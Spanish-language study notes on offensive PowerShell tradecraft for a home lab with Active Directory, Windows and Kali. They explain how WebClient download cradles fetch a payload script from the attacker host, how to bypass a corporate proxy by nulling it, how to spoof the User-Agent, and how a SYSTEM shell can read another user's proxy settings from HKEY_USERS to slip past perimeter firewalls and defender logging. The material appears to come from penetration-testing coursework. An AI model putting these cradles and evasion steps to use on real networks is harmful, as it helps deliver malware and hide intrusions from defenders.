Este texto explica un concepto crucial en entornos corporativos reales: cómo los proxies de red afectan la entrega de tus payloads, y cómo tu download cradle (el script de PowerShell que descarga el payload) interactúa con ellos.

En tu laboratorio actual tienes un AD (con el server y una máquina Windows) y Kali. En un entorno real, es muy probable que ese AD tenga configurado un proxy a través de GPO (Group Policy) para que todo el tráfico de las máquinas Windows salga por ahí. Esto permite a los defensores registrar y bloquear conexiones.

Aquí te explico qué dice el texto y cómo se aplica a tu entorno:

🌐 El Concepto Clave: Net.WebClient es "Proxy-Aware"
Cuando usas New-Object System.Net.WebClient en PowerShell para descargar tu run.ps1, este objeto lee automáticamente la configuración de proxy del sistema (la que está en Opciones de Internet > Conexiones > Configuración de LAN).

Si tu máquina Windows víctima tiene un proxy configurado (por ejemplo, 192.168.120.12:3128), el WebClient enviará la petición HTTP al proxy, y el proxy la reenviará a Kali.

¿Cómo se ve esto en los logs de Kali?

Con proxy: El servidor web de Kali (Apache o Python) registra la petición como proveniente de la IP del proxy (192.168.120.12), no de la víctima.

Sin proxy: La petición viene directamente de la IP de la víctima (192.168.120.11).

El texto muestra cómo verificar esto:

Configuras el proxy en Windows.

Ejecutas el download cradle: $wc.DownloadString("http://KALI/run.ps1").

Miras los logs de Kali: tail /var/log/apache2/access.log.

Confirmas que la petición viene del proxy.

🔍 Cómo inspeccionar la configuración del proxy
Puedes ver qué proxy está usando WebClient ejecutando:
```
powershell
[System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://192.168.0.253:8000/run.ps1")
Esto te devolverá un objeto con la IP y el puerto del proxy que está usando. Si no hay proxy configurado, devolverá la URL original.
```
🛡️ Cómo EVADIR el proxy (Bypass)
El texto revela una técnica muy útil: puedes desactivar el uso del proxy manualmente en tu download cradle. Esto se hace "anulando" la propiedad .proxy del objeto WebClient:

```
powershell
$wc = New-Object System.Net.WebClient
$wc.proxy = $null  # <--- Aquí desactivas el proxy
$wc.DownloadString("http://192.168.0.253:8000/run.ps1")
Al hacer esto, fuerzas a que la conexión salga directamente desde la máquina víctima hacia tu Kali, sin pasar por el proxy.
```

¿Por qué harías esto?

Evadir la monitorización: El proxy es un punto donde los defensores pueden registrar todo el tráfico y bloquear dominios maliciosos. Si lo saltas, evitas ese registro.

Problemas de conectividad: A veces, el proxy corporativo bloquea conexiones a IPs externas o a puertos no estándar (como el 8000 que usas). Saltarse el proxy puede permitir la conexión.

⚠️ Riesgo: En algunas redes, si intentas salir directamente a Internet sin pasar por el proxy, el firewall perimetral bloqueará la conexión (política de "deny direct"). En ese caso, el bypass no funcionará y tendrás que usar el proxy de todas formas.

🧪 Cómo probar esto en TU laboratorio (AD + Windows + Kali)
Para replicar esto en tu entorno:

Configura un Proxy: Puedes instalar Squid en una máquina Linux (o en otra máquina Windows) para que actúe como proxy. O, más fácil aún, puedes configurar el proxy manualmente en la máquina Windows víctima (Configuración > Red e Internet > Proxy > Configuración manual) apuntando a una IP ficticia o a una herramienta como Burp Suite en Kali (que actúa como proxy).

Prueba el Download Cradle con proxy: Ejecuta tu macro y observa los logs de Kali. Verás que la petición viene de la IP del proxy (si está bien configurado).

Prueba el Bypass: Modifica tu run.ps1 o el comando de descarga para añadir $wc.proxy = $null. Vuelve a ejecutar. Ahora la petición debería venir directamente de la IP de la víctima en los logs de Kali.

Prueba con AD/GPO: Si quieres ser más realista, configura el proxy a través de una GPO en tu Domain Controller. Así, todas las máquinas del dominio lo usarán automáticamente. Luego prueba tu macro con y sin el bypass.

💡 Conclusión para tu laboratorio
Este texto es una guía para adaptarte a redes corporativas. En tu laboratorio actual, si no tienes un proxy configurado, el WebClient irá directo a Kali sin problemas. Pero si quieres simular un entorno corporativo real, configura un proxy en tu AD y practica:

Entrega normal (a través del proxy).

Entrega con bypass ($wc.proxy = $null).

Esto te preparará para escenarios reales donde los proxies pueden bloquear o registrar tus ataques.

## Fiddling With The User-Agent

```
$wc = new-object system.net.WebClient
$wc.Headers.Add('User-Agent', "This is my agent, there is no one like it...")
$wc.DownloadString("http://192.168.119.120/run.ps1")
```
## 🎯 El Problema: SYSTEM no tiene proxy

Cuando ejecutas tu download cradle (Net.WebClient) como un usuario normal, este lee la configuración de proxy que está guardada en el registro de Windows bajo HKEY_CURRENT_USER (HKCU). Esto funciona perfectamente.

Sin embargo, cuando obtienes una shell con privilegios de SYSTEM (por ejemplo, usando PsExec -s o explotando un servicio), el usuario SYSTEM no tiene un perfil de usuario ni una configuración de proxy en HKCU.

¿El resultado? Tu download cradle intenta conectarse directamente a tu servidor de Kali, ignorando el proxy por completo.

En el mejor de los casos, esto funciona (si la red lo permite).

En el peor de los casos (redes corporativas reales), el firewall perimetral bloqueará la conexión directa y tu shell no podrá descargar el payload. Además, los defensores verán una conexión directa sospechosa en lugar del tráfico normal del proxy.

## ⚙️ La Solución: "Robar" la configuración de proxy de un usuario real
Para solucionarlo, el script realiza los siguientes pasos:

Mapear el registro HKEY_USERS: Como SYSTEM no tiene HKCU, usamos HKEY_USERS (HKU), que contiene los perfiles de todos los usuarios del sistema.

```powershell
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
Encontrar un usuario real: Recorremos HKU:\ buscando un SID que empiece por S-1-5-21- (que identifica a usuarios reales, no a cuentas de sistema como S-1-5-18 que es SYSTEM).
```
```powershell
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}
$start guardará el SID del primer usuario que encuentre.
```
Extraer la dirección del proxy: Leemos el valor ProxyServer del registro de ese usuario.

```powershell
$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
```
> $proxyAddr contendrá algo como 192.168.120.12:3128.

Crear y asignar el objeto Proxy: Creamos un objeto System.Net.WebProxy con esa dirección y lo asignamos como el proxy por defecto para todas las peticiones web.

```powershell
[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
```
Ejecutar el download cradle: Ahora, cuando WebClient haga la petición, usará el proxy que acabamos de configurar.

```powershell
$wc = new-object system.net.WebClient
$wc.DownloadString("http://192.168.119.120/run2.ps1")
```
💡 Detalles importantes del texto
Renombrar run.ps1 a run2.ps1: PowerShell a veces cachea los scripts descargados. Si usas el mismo nombre, podrías recibir una versión antigua en caché. Cambiar el nombre fuerza una descarga fresca.

Cerrar la sesión de PowerShell: El comando New-PSDrive para mapear HKU persiste durante toda la sesión de PowerShell. Si ejecutas el script varias veces, puede dar error. Cierra y vuelve a abrir PowerShell ISE antes de cada prueba.

Filtro S-1-5-21-*: Es crucial. Los SIDs que empiezan por S-1-5-21- son de usuarios reales (dominio o locales). Otros SIDs como S-1-5-18 (SYSTEM), S-1-5-19 (LocalService) o S-1-5-20 (NetworkService) no tienen configuraciones de proxy útiles.

🧪 Cómo probar esto en tu laboratorio
Configura un proxy: Puedes usar una máquina Linux con Squid o Burp Suite en Kali para actuar como proxy.

Configura el proxy en tu máquina Windows víctima (como usuario normal).

Obtén una shell de SYSTEM: Usa PsExec.exe -s -i C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe desde una CMD elevada.

Prueba el cradle básico: Ejecuta $wc.DownloadString(...) y mira los logs de Kali. Verás la IP de la víctima directamente (sin proxy).

Prueba el cradle avanzado: Ejecuta el código del Listing 111. Ahora mira los logs de Kali. ¡Verás que la petición viene de la IP del proxy!

En resumen: Este script te enseña a "heredar" la configuración de red de un usuario normal cuando te encuentras en una shell de SYSTEM, permitiéndote evadir firewalls y pasar desapercibido en redes corporativas con proxy obligatorio. Es una técnica de evasión y adaptación a entornos reales muy valiosa.






